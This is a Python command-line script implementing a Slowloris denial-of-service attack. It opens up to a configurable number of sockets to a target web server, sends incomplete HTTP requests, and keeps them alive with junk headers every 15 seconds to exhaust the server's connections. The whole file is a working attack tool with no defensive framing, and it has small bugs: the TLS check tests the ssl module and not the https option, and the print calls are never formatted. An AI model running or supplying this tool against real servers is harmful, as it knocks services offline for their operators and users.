import click
from scapy.all import TCP, IP, conf, send
from time import sleep
import argparse
import logging
import random
import socket
import ssl
import sys
import time

def init_socket(host, port, https=False):

    ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if ssl:
        s = ssl.wrap_socket(s)

    s.connect((host, port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(ua).encode())
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode())

    return s


@click.command()
@click.argument('host')
@click.option('-c', 'count', default=100, help='How many sockets (default: 100)')
@click.option('-p', 'port', default=80, help='Port to use (default: 80)')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
@click.option('--https', is_flag=True, default=False, help='Use SSL/TLS (default: No)')
def cmd_slowloris(host, count, port, https, verbose):

    list_of_sockets = []

    socket_count = count
    print("Attacking %s with %s sockets.", host, socket_count)
    print("Creating sockets...")

    for _ in range(count):
        try:
            print("Creating socket nr %s", _)
            s = init_socket(host, port, https)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        print("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            print("Recreating socket...")
            try:
                s = init_socket(host, port, https)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break

        time.sleep(15)


if __name__ == '__main__':
    cmd_slowloris()

